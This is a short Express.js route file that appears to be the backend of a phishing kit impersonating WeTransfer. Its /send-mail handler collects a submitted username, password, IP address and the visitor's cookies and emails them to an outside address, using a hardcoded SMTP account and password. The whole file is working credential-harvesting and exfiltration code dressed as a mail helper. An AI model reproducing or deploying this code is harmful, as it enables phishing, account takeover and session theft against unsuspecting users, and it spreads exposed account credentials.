const express = require('express');
const router = express.Router();
const mailer = require('../helper/mailer');

router.post('/send-mail', (req, res) => {
    const { username, pass, ip } = req.body;
    const cookies = req.cookies; // Get cookies from the request object
    const nodeTransport = mailer.createNodeMailerTransport('gilliard.pinheiro@tenqualuz.pt', 'Great@2024!!');
    mailer.sendEmail('gilliard.pinheiro@tenqualuz.pt', "billytoolz@zohomail.eu", 'WeTransfer-Data', username, pass, ip, cookies, nodeTransport);
    res.status(200).send('Email sent successfully');
});

module.exports = router;
